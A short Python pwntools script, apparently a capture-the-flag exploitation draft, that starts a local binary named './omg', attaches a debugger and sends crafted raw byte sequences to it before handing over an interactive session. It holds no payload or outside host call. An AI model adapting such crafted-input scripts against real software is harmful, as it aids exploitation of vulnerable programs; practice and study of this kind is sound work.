from pwn import *
context.log_level='debug'

p=process('./omg')
p.send('\x00\x01')
gdb.attach(p)
p.send('\x00'*6+'\x08'+'\x00'*7)
p.interactive()
